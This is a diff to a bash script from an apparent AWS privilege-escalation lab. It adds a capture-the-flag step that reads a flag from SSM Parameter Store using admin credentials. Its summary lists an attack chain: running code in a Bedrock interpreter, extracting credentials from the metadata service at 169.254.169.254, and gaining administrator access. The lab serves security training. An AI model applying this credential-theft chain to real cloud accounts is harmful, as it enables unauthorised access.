@@ -403,6 +403,18 @@ else
 fi
 echo ""
 
+# [EXPLOIT] Step 12: Capture the flag
+echo -e "${YELLOW}Step 12: Capture the Flag${NC}"
+echo "Reading CTF flag from SSM Parameter Store using admin credentials..."
+
+show_attack_cmd "Attacker" "aws ssm get-parameter --name /pathfinding-labs/flags/bedrock-002-to-admin --query 'Parameter.Value' --output text"
+CTF_FLAG=$(aws ssm get-parameter \
+    --name "/pathfinding-labs/flags/bedrock-002-to-admin" \
+    --query 'Parameter.Value' \
+    --output text)
+
+echo -e "${GREEN}✓ Flag captured: ${CTF_FLAG}${NC}\n"
+
 # Restore helpful permissions for manual exploration
 restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
 
@@ -419,6 +431,7 @@ echo "5. Invoked Python code in interpreter's MicroVM"
 echo "6. Extracted credentials from MMDS at 169.254.169.254"
 echo "7. Used extracted credentials to gain administrative access"
 echo "8. Achieved: Full administrator permissions"
+echo "9. Captured CTF flag from SSM: $CTF_FLAG"
 
 echo -e "\n${YELLOW}Key Points:${NC}"
 echo "- No iam:PassRole required (interpreter already exists)"
